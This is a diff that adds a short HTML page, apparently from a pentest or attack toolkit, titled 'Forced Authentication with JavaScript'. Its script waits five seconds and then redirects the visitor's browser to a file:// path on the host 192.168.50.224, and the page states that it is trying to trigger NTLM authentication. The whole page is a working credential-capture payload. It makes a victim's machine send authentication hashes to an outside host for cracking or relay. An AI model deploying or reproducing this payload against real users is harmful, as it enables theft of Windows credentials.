@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Forced Authentication with JavaScript</title>
+</head>
+<body>
+    <script>
+        setTimeout(function() {
+            window.location = "file://192.168.50.224/files/logo.png";
+        }, 5000); // Wait for 5 seconds before redirecting
+    </script>
+    <div>Attempting to trigger NTLM authentication...</div>
+</body>
+</html>
